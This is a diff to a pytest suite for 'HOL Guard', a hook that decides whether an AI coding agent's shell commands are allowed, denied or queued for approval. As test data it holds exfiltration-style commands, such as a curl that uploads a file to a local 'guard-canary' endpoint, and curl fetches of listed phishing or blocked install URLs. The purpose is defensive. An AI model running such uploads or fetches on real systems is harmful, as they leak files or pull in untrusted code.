@@ -12,6 +12,7 @@ import sys
 import threading
 import urllib.parse
 import urllib.request
+from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from typing import ClassVar
@@ -2958,7 +2959,10 @@ args = ["workspace-skill.js", "--changed"]
             guard_home=home_dir,
         )
         expected_session_start_argv = ClaudeCodeHarnessAdapter._session_start_command_parts(context)
-        assert guard_pretool_entry["matcher"] == "Bash|PowerShell|Read|Grep|Write|Edit|MultiEdit|WebFetch|WebSearch|mcp__.*"
+        assert (
+            guard_pretool_entry["matcher"]
+            == "Bash|PowerShell|Read|Grep|Write|Edit|MultiEdit|WebFetch|WebSearch|mcp__.*"
+        )
         assert (
             _command_handler_argv(install_settings_payload["hooks"]["SessionStart"][0]["hooks"][0])
             == expected_session_start_argv
@@ -5026,7 +5030,7 @@ args = ["-lc", "echo hi"]
 """.strip()
             + "\n",
         )
-        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda command: True)
+        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda *_args: True)
 
         rc = main(["guard", "doctor", "codex", "--home", str(home_dir), "--json"])
         output = json.loads(capsys.readouterr().out)
@@ -5049,7 +5053,7 @@ args = ["-lc", "echo hi"]
             )
             + "\n",
         )
-        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda command: True)
+        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda *_args: True)
 
         rc = main(["guard", "doctor", "codex", "--home", str(home_dir), "--guard-home", str(guard_home), "--json"])
         output = json.loads(capsys.readouterr().out)
@@ -5081,7 +5085,7 @@ args = ["-lc", "echo hi"]
 """.strip()
             + "\n",
         )
-        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda command: True)
+        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda *_args: True)
         monkeypatch.setattr(
             GuardStore,
             "get_effective_guard_connect_state",
@@ -5384,7 +5388,7 @@ args = ["-lc", "echo hi"]
         home_dir = tmp_path / "home"
         guard_home = tmp_path / "guard-home"
         _write_text(guard_home / "config.toml", "runtime_detector_registry = true\n")
-        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda command: True)
+        monkeypatch.setattr("codex_plugin_scanner.guard.adapters.codex._command_available", lambda *_args: True)
 
         rc = main(["guard", "doctor", "codex", "--home", str(home_dir), "--guard-home", str(guard_home)])
         output = capsys.readouterr().out
@@ -5435,11 +5439,25 @@ curl --data-binary @"$1" http://127.0.0.1:8787/guard-canary
         reason = output["hookSpecificOutput"]["permissionDecisionReason"]
         assert reason.startswith("HOL Guard")
         assert "http://127.0.0.1:" not in reason
-        assert "approve" not in reason.lower()
+        queued = GuardStore(home_dir).list_approval_requests(limit=5)
+        if queued:
+            # Where the daemon can bind the script's bytes to its run, it queues
+            # the reviewed version for approval and names the request to wait on.
+            assert len(queued) == 1
+            assert output["policy_action"] in {"review", "require-reapproval", "block"}, output
+            assert "hol-guard approvals wait" in reason
+        elif output["policy_action"] == "sandbox-required":
+            # Where the workspace sandbox is available, the daemon only lets the
+            # script run contained, without the network the upload needs.
+            assert output["reason_code"] == "native_workspace_containment_required"
+            assert "approval_requests" not in output
+        else:
+            assert output["policy_action"] == "block", output
+            assert "approve" not in reason.lower(), output
 
     @pytest.mark.usefixtures("native_command_artifact_reviews")
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_emits_json_denial_in_actual_codex_runtime(self, tmp_path, monkeypatch, capsys):
+    def test_guard_codex_hook_allows_workspace_write_in_codex_runtime(self, tmp_path, monkeypatch, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -5466,14 +5484,11 @@ curl --data-binary @"$1" http://127.0.0.1:8787/guard-canary
 
         output = json.loads(captured.out)
 
+        # A redirect into a new file inside the workspace is ordinary work.
         assert rc == 0
         assert captured.err == ""
         assert output["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
-        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
-        reason = output["hookSpecificOutput"]["permissionDecisionReason"]
-        assert reason.startswith("HOL Guard")
-        assert "http://127.0.0.1:" not in reason
-        assert "approve" not in reason.lower()
+        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
 
     @pytest.mark.usefixtures("native_hook_force")
     def test_guard_codex_pretooluse_returns_without_browser_wait_for_secret_exfil(self, tmp_path, monkeypatch, capsys):
@@ -5546,6 +5561,59 @@ curl --data-binary @"$1" http://127.0.0.1:8787/guard-canary
 
         assert rc == 0
         assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    @pytest.mark.usefixtures("native_hook_force")
+    @pytest.mark.parametrize(
+        ("command", "decision", "reason"),
+        [
+            ("curl -s https://login-verify.pages.dev/", "deny", "login-verify.pages.dev hosts URLs listed"),
+            ("curl -s http://login-verify.pages.dev/", "deny", "login-verify.pages.dev hosts URLs listed"),
+            ("curl -s https://api.blocked.example/install.sh", "deny", "api.blocked.example"),
+            ("curl -s https://docs.example/guide/intro", "deny", None),
+        ],
+    )
+    def test_guard_codex_hook_applies_the_saved_network_bundle(self, tmp_path, capsys, command, decision, reason):
+        from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key
+
+        from codex_plugin_scanner.guard.runtime.network_protection_bundle import NETWORK_PROTECTION_SYNC_STATE_KEY
+
+        from .test_network_protection_bundle import _iso, _response, _verify
+
+        home_dir = tmp_path / "home"
+        workspace_dir = tmp_path / "workspace"
+        payload_path = workspace_dir / "hook-event.json"
+        _write_codex_pre_tool_payload(payload_path, workspace_dir, command)
+        # Indicators older than a week stop applying, so the bundle is current.
+        now = datetime.now(timezone.utc)
+        key = generate_private_key(public_exponent=65537, key_size=2048)
+        GuardStore(home_dir).set_sync_payload(
+            NETWORK_PROTECTION_SYNC_STATE_KEY,
+            _verify(_response(key, generated_at=now), key, now=now.timestamp()),
+            _iso(now),
+        )
+
+        rc = main(
+            [
+                "guard",
+                "hook",
+                "--json",
+                "--harness",
+                "codex",
+                "--home",
+                str(home_dir),
+                "--workspace",
+                str(workspace_dir),
+                "--event-file",
+                str(payload_path),
+            ]
+        )
+        output = json.loads(capsys.readouterr().out)
+
+        assert rc == 0
+        hook_output = output["hookSpecificOutput"]
+        assert hook_output["permissionDecision"] == decision
+        if reason is not None:
+            assert reason in hook_output["permissionDecisionReason"]
 
     @pytest.mark.usefixtures("native_hook_force")
     def test_guard_codex_hook_blocks_clustered_curl_upload_file_path(self, tmp_path, capsys):
@@ -6675,7 +6743,7 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
     def test_guard_codex_hook_blocks_curl_config_from_multi_stage_literal_pipe(self, tmp_path, capsys):
@@ -6706,7 +6774,7 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
     def test_guard_codex_hook_blocks_clustered_curl_data_consuming_upload_flag_token(self, tmp_path, capsys):
@@ -6771,7 +6839,7 @@ url = http://127.0.0.1:8787/guard-canary
         assert output["hookSpecificOutput"]["permissionDecision"] in {"allow", "deny"}
 
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_allows_curl_data_urlencode_named_literal_at_value(self, tmp_path, capsys):
+    def test_guard_codex_hook_reviews_curl_data_urlencode_named_literal_at_value(self, tmp_path, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -6799,10 +6867,10 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_allows_clustered_curl_request_method(self, tmp_path, capsys):
+    def test_guard_codex_hook_reviews_clustered_curl_request_method(self, tmp_path, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -6830,10 +6898,10 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_allows_clustered_curl_quote_command(self, tmp_path, capsys):
+    def test_guard_codex_hook_reviews_clustered_curl_quote_command(self, tmp_path, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -6861,10 +6929,10 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_allows_clustered_curl_telnet_option(self, tmp_path, capsys):
+    def test_guard_codex_hook_reviews_clustered_curl_telnet_option(self, tmp_path, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -6892,10 +6960,10 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
-    def test_guard_codex_hook_allows_clustered_curl_range(self, tmp_path, capsys):
+    def test_guard_codex_hook_reviews_clustered_curl_range(self, tmp_path, capsys):
         home_dir = tmp_path / "home"
         workspace_dir = tmp_path / "workspace"
         payload_path = workspace_dir / "hook-event.json"
@@ -6923,7 +6991,7 @@ url = http://127.0.0.1:8787/guard-canary
         output = json.loads(capsys.readouterr().out)
 
         assert rc == 0
-        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
+        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
 
     @pytest.mark.usefixtures("native_hook_force")
     def test_guard_codex_hook_allows_quoted_process_substitution_literal(self, tmp_path, capsys):
